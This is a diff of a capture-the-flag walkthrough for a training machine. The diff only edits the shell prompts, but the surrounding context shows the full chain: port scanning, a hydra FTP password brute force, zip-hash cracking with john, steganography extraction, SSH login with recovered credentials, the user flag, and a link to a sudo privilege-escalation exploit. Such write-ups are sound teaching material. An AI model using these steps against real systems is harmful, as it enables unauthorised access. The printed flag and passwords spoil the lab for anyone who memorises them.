@@ -6,8 +6,8 @@ Deploy the machine.
 
 ## Task2
 ### Haw many open ports?
-```shell
-[x270@X270]$ nmap -sC -sV -Pn 10.10.83.89
+```sh
+$ nmap -sC -sV -Pn 10.10.83.89
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 16:52 JST
 Nmap scan report for 10.10.83.89
@@ -30,8 +30,8 @@ Nmap done: 1 IP address (1 host up) scanned in 39.71 seconds
 ```
 
 ### How you redirect yourself to a secret page?
-```
-[x270@X270]$ curl 10.10.83.89
+```sh
+$ curl 10.10.83.89
 
 <!DocType html>
 <html>
@@ -53,8 +53,8 @@ Nmap done: 1 IP address (1 host up) scanned in 39.71 seconds
 ```
 
 ### What is the agent name?
-```shell
-[x270@X270]$ curl -A "C" -L 10.10.83.89
+```sh
+$ curl -A "C" -L 10.10.83.89
 Attention chris, <br><br>
 
 Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
@@ -64,8 +64,8 @@ Agent R
 ```
 ## Task3
 ### FTP password
-```shell
-[x270@X270]$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.83.89 ftp
+```sh
+$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.83.89 ftp
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-02 16:56:04
@@ -77,8 +77,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-02 16:57:
 ```
 
 ### Zip file password
-```shell
-[x270@X270]$ ftp 10.10.83.89
+```sh
+$ ftp 10.10.83.89
 Connected to 10.10.83.89.
 220 (vsFTPd 3.0.3)
 Name (10.10.83.89:x270): chris
@@ -112,7 +112,7 @@ mget cutie.png? y
 34842 bytes received in 0.28 secs (120.7966 kB/s)
 ftp> quit
 221 Goodbye.
-[x270@X270]$ binwalk cutie.png 
+$ binwalk cutie.png 
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -121,7 +121,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive, footer length: 22
 
-[x270@X270]$ binwalk -e cutie.png 
+$ binwalk -e cutie.png 
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
@@ -130,12 +130,12 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive, footer length: 22
 
-[x270@X270]$ cd _cutie.png.extracted/
-[x270@X270]$ ls
+$ cd _cutie.png.extracted/
+$ ls
 365  365.zlib  8702.zip  To_agentR.txt
-[x270@X270]$ zip2john 8702.zip > zip.hash
+$ zip2john 8702.zip > zip.hash
 ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
-[x270@X270]$ john zip.hash
+$ john zip.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
 Will run 4 OpenMP threads
@@ -148,7 +148,7 @@ alien            (8702.zip/To_agentR.txt)
 1g 0:00:00:01 DONE 2/3 (2021-10-02 17:00) 0.5649g/s 25449p/s 25449c/s 25449C/s 123456..ferrises
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-[x270@X270]$ 7z e 8702.zip 
+$ 7z e 8702.zip 
 
 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
 p7zip Version 16.02 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz (806E9),ASM,AES-NI)
@@ -179,9 +179,9 @@ Everything is Ok
 
 Size:       86
 Compressed: 280
-[x270@X270]$ ls
+$ ls
 365  365.zlib  8702.zip  To_agentR.txt  zip.hash
-[x270@X270]$ cat To_agentR.txt 
+$ cat To_agentR.txt 
 Agent C,
 
 We need to send the picture to 'QXJlYTUx' as soon as possible!
@@ -191,17 +191,17 @@ Agent R
 ```
 
 ### steg password
-```shell
-[x270@X270]$ echo QXJlYTUx | base64 -d
+```sh
+$ echo QXJlYTUx | base64 -d
 Area51
 ```
 
 ### Who is the other agent (in full name)?, SSH password
-```shell
-[x270@X270]$ steghide extract -sf cute-alien.jpg 
+```sh
+$ steghide extract -sf cute-alien.jpg 
 Enter passphrase: 
 wrote extracted data to "message.txt".
-[x270@X270]$ cat message.txt 
+$ cat message.txt 
 Hi james,
 
 Glad you find this message. Your login password is hackerrules!
@@ -214,8 +214,8 @@ chris
 
 ## Task4
 ### What is the user flag?
-```shell
-[x270@X270]$ ssh james@10.10.83.89
+```sh
+$ ssh james@10.10.83.89
 james@10.10.83.89's password: 
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
 
@@ -243,11 +243,11 @@ b03d975e8c92a7c04146cfa7a5a313c7
 ```
 
 ### What is the incident of the photo called?
-```shell
+```sh
 james@agent-sudo:~$ exit
 logout
 Connection to 10.10.83.89 closed.
-[x270@X270]$ scp james@10.10.83.89:Alien_autospy.jpg ./
+$ scp james@10.10.83.89:Alien_autospy.jpg ./
 james@10.10.83.89's password: 
 Alien_autospy.jpg  
 ```
@@ -256,7 +256,7 @@ I don't want to look directly at these pictures...🤢
 
 ## Task5  
 https://www.exploit-db.com/exploits/47502  
-```shell
+```sh
 james@agent-sudo:~$ whoami
 james
 james@agent-sudo:~$ sudo -l
